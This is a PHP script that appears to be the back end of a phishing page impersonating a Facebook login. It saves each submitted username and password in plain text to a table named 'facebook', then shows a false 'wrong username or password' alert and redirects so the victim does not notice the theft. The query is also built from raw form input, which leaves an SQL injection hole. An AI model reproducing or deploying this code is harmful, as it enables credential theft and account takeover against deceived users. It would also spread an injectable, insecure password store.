<?php
require_once "Persist.php";
if(isset($_POST['username'])){
    $username=$_POST['username'];
    $password=$_POST['password'];
    $query="insert into facebook (username,password) values ('$username','$password')";
    Persist::executeUpdate($query);
    echo "<script>window.alert('Error: wrong username or password');window.location.href='index.php';</script>";
}